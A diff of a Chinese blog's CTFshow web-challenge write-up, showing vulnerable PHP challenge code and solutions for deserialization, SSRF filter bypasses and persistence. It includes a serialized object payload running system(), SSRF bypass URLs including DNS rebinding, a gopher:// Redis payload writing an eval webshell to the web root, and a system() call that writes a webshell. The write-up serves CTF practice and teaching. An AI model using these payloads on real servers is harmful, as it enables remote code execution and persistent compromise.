+        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;
+    &#125;
+&#125;</code></pre>
+
+<p>比上一题多了个<code>username!=passwd</code></p>
+<h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
+    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
+    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
+    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;
+    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;
+        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span>
+<span class="class">    &#125;</span>
+<span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;
+        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
+    &#125;
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
+        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span>
+<span class="class">    &#125;</span>
+<span class="class">&#125;</span>
+<span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;
+    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
+        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;
+    &#125;
+&#125;
+<span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;
+    <span class="keyword">private</span> <span class="variable">$code</span>;
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
+        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);
+    &#125;
+&#125;
+<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
+<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];
+<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;
+    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);
+    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);
+&#125;</code></pre>
+
+<p>这里看上部分即可</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
+    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
+    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
+    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;
+    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;
+        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span>
+<span class="class">    &#125;</span>
+<span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;
+        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
+    &#125;
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
+        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span>
+<span class="class">    &#125;</span>
+<span class="class">&#125;</span>
+<span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;
+    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
+        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;
+    &#125;
+&#125;
+<span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;
+    <span class="keyword">private</span> <span class="variable">$code</span>;
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
+        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);
+    &#125;
+&#125;</code></pre>
+
+<p>直接利用<code>backDoor</code>类来RCE</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
+    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;1&#x27;</span>;
+    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;2&#x27;</span>;
+    <span class="keyword">public</span> <span class="variable">$isVip</span>=True;
+    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;
+&#125;
+<span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;
+    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;&#x27;</span>;
+&#125;
+<span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;
+    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;
+&#125;
+<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();
+<span class="variable">$a</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span>
+<span class="class"><span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>($<span class="title">a</span>));</span></code></pre>
+
+<p>成功执行</p>
+<h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+
+<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
+    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
+    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
+    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;
+    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;
+
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;
+        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span>
+<span class="class">    &#125;</span>
+<span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;
+        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
+    &#125;
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
+        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span>
+<span class="class">    &#125;</span>
+<span class="class"></span>
+<span class="class">&#125;</span>
+<span class="class"></span>
+<span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;
+    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
+        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;
+    &#125;
+&#125;
+
+<span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;
+    <span class="keyword">public</span> <span class="variable">$code</span>;
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
+        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);
+    &#125;
+&#125;
+
+<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
+<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];
+
+<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;
+    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;
+        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);
+    &#125;
+    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);
+&#125;</code></pre>
+
+<p>Cookie不允许O&#x2F;C开头，后面不准接数字</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
+<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
+<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
+<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
+<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
+<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
+<span class="keyword">echo</span> (<span class="variable">$result</span>);
+<span class="meta">?&gt;</span></code></pre>
+
+<p>直接访问提示非本地用户禁止访问，既然是SSRF那就是在URL里输入<code>127.0.0.1/flag.php</code></p>
+<h3 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
+<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
+<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
+<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;
+<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
+<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
+<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
+<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
+<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
+<span class="keyword">echo</span> (<span class="variable">$result</span>);
+&#125;
+<span class="keyword">else</span>&#123;
+    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
+&#125;
+&#125;
+<span class="keyword">else</span>&#123;
+    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
+&#125;
+<span class="meta">?&gt;</span> hacker</code></pre>
+
+<pre><code class="highlight plaintext">parse_url这个是用来处理URL的，把它解析成各个部分后存储到数组里面
+并且要求头为http/https
+问题来了它这个正则写的一拓实，没waf一样</code></pre>
+
+<p><code>flag.php</code>一如既往的非本地无法访问,直接加个头就行</p>
+<pre><code class="highlight plaintext">http://127.0.0.1/flag.php</code></pre>
+
+<h3 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
+<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
+<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
+<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="variable">$url</span>))&#123;
+<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
+<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
+<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
+<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
+<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
+<span class="keyword">echo</span> (<span class="variable">$result</span>);
+&#125;
+<span class="keyword">else</span>&#123;
+    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
+&#125;
+&#125;
+<span class="keyword">else</span>&#123;
+    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
+&#125;
+<span class="meta">?&gt;</span> hacker</code></pre>
+
+<p>对味</p>
+<p>那我要用邪门一点的方式来绕过了</p>
+<pre><code class="highlight plaintext">http://127.1/flag.php</code></pre>
+
+<p>对于形式这样的ip<code>x.0.0.1</code>可以直接缩写为<code>x.1</code></p>
+<p>同时也可以进制替换</p>
+<pre><code class="highlight plaintext">127.0.0.0/8是一个环回地址网段，从127.0.0.1 ~ 127.255.255.254都表示localhost
+也就是说http://127.1.1.1/flag.php其实也可以的</code></pre>
+
+<h3 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
+<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
+<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
+<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="variable">$url</span>))&#123;
+<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
+<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
+<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
+<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
+<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
+<span class="keyword">echo</span> (<span class="variable">$result</span>);
+&#125;
+<span class="keyword">else</span>&#123;
+    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
+&#125;
+&#125;
+<span class="keyword">else</span>&#123;
+    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
+&#125;
+<span class="meta">?&gt;</span></code></pre>
+
+<p>这里主要的数字都waf了</p>
+<p>那么可以有下面几种想法:</p>
+<pre><code class="highlight plaintext">域名指向127
+302跳转
+DNS-Rebinding</code></pre>
+
+<ul>
+<li><ol>
+<li>在自己的域名里添加一条A记录指向<code>127.0.0.1</code></li>
+</ol>
+</li>
+<li><ol start="2">
+<li>在自己的网站页面添加</li>
+</ol>
+</li>
+<li><ol start="3">
+<li>自己去ceye.io注册绑定<code>127.0.0.1</code>然后记得前面加r</li>
+</ol>
+</li>
+</ul>
+<pre><code class="highlight plaintext">url=http://r.xxxzc8.ceye.io/flag.php</code></pre>
+
+<h3 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
+<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
+<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
+<span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];
+<span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;
+<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
+<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
+<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
+<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
+<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
+<span class="keyword">echo</span> (<span class="variable">$result</span>);
+&#125;
+<span class="keyword">else</span>&#123;
+    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
+&#125;
+&#125;
+<span class="keyword">else</span>&#123;
+    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
+&#125;
+<span class="meta">?&gt;</span></code></pre>
+
+<p>将主机名限制到5位以内，那用缩写格式就行</p>
+<p><code>127.1或者0(其实就是0.0.0.0)</code></p>
+<h3 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h3><pre><code class="highlight plaintext">&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST[&#x27;url&#x27;];
+$x=parse_url($url);
+if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;
+$host=$x[&#x27;host&#x27;];
+if((strlen($host)&lt;=3))&#123;
+$ch=curl_init($url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$result=curl_exec($ch);
+curl_close($ch);
+echo ($result);
+&#125;
+else&#123;
+    die(&#x27;hacker&#x27;);
+&#125;
+&#125;
+else&#123;
+    die(&#x27;hacker&#x27;);
+&#125;
+?&gt;</code></pre>
+
+<p>限制到3位以内，127用不了了0可以</p>
+<h3 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
+<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
+<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
+<span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);
+<span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;
+<span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;
+    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);
+&#125;
+
+
+<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);
+&#125;
+<span class="keyword">else</span>&#123;
+    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);
+&#125;
+<span class="meta">?&gt;</span></code></pre>
+
+<p>不是很懂。。</p>
+<pre><code class="highlight plaintext">gethostbyname:成功时返回 IPv4 地址，失败时返回主机名。
+filter_var() 函数通过指定的过滤器过滤一个变量。
+FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）。
+FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）。
+FILTER_FLAG_NO_PRIV_RANGE - 要求值不在 RFC 指定的私有范围 IP 内（比如 192.168.0.1）。
+FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</code></pre>
+
+<p>也就是说这里会验证URL的IP地址不在RFC指定的<code>私有IP</code>范围内（比如 192.168.0.1），且要求值不在<code>保留的IP</code>范围内。</p>
+<p>使用DNS重绑定或者用自己的服务器打302</p>
+<p>这里可以用第一个，因为有个快捷的网站</p>
+<pre><code class="highlight plaintext">https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg</code></pre>
+
+<p>可以直接重绑定，你输一个不会触发内网ip验证的就可以，发包三次就可以拿到flag</p>
+<pre><code class="highlight plaintext">分别是:127.0.0.1 ip!
+1.1.1.1（我重绑定的ip
+1.1.1.1 flag</code></pre>
+
+<p>为什么是三次?我也不知道，调试一下看看好了</p>
+<p>但是怪就怪在我自己调是只有爆ip的，出不来。。</p>
+<h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
+<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
+<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;
+    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);
+&#125;</code></pre>
+
+<p>要用<code>http://ctf</code>开头<code>show</code>结尾</p>
+<p>这里利用@</p>
+<pre><code class="highlight plaintext">在URL中，@符号通常用于在基本认证（Basic Authentication）中，将用户名和密码包含在URL中。这种用法的格式是：
+http://username:password@hostname/path
+在这个格式中，username:password 是登录所需的凭据，@ 符号用来分隔凭据和主机名。然而，这种做法在现代网络应用中不推荐使用，因为它容易导致安全问题，比如泄露用户凭据。</code></pre>
+
+<pre><code class="highlight plaintext">POC:
+url=http://ctf.com@127.0.0.1/flag.php#show
+url=http://ctf.com@127.0.0.1/flag.php?show</code></pre>
+
+<h3 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h3><pre><code class="highlight plaintext">打无密码的mysql</code></pre>
+
+<p>随便输一下转到<code>check.php</code></p>
+<p>看到<code>POST:returl=https://404.chall.ctf.show/&amp;u=admin</code></p>
+<p>那看来这边可以写马发gopher包了</p>
+<p>这里介绍一个工具<code>gopherus</code><a href="https://github.com/tarunkant/Gopherus.git">https://github.com/tarunkant/Gopherus.git</a></p>
+<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250710143949440.png" alt="image-20250710143949440"></p>
+<p><code>_</code>后面的部分记得二次URL编码(因为发送过去时会被编码一次)</p>
+<p>写入成功直接连即可</p>
+<h3 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
+<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
+<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
+<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
+<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
+<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
+<span class="keyword">echo</span> (<span class="variable">$result</span>);
+<span class="meta">?&gt;</span></code></pre>
+
+<p>看似平平无奇，实则暗藏杀机。。</p>
+<p><code>file://</code>协议读不出东西</p>
+<p>尝试用<code>dict://</code>探测一下端口</p>
+<p>最后发现redis的端口是开放的</p>
+<pre><code class="highlight plaintext">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5Bcmd%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code></pre>
+
+<p>记得把<code>_</code>后边编码</p>
+<p>接着POST一下，这里不知道为什么POST会卡住然后报错504</p>
+<p>但是shell.php是存在的，不知道为什么啊。。希望有大佬可以解答一下</p>
+<p>最后直接命令执行即可，喜欢蚁剑也可以</p>
 <h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="web670"><a href="#web670" class="headerlink" title="web670"></a>web670</h3><pre><code class="highlight plaintext">system(&#x27;echo &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot; &gt;shell.php&#x27;);
 var_dump(getcwd()); =&gt;/var/www/html</code></pre>
 
@@ -6564,7 +7550,7 @@ conversions = &#123;
 <p>这里直接给某个师傅博客的截图，这是原链接<a href="https://www.anquanke.com/post/id/202510#h3-15">探索php:&#x2F;&#x2F;filter在实战当中的奇技淫巧-安全KER - 安全资讯平台</a>，懒得打了(瘫)</p>
 <h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
       <tags>
-        <tag>CTF Web</tag>
+        <tag>-CTF -Web</tag>
       </tags>
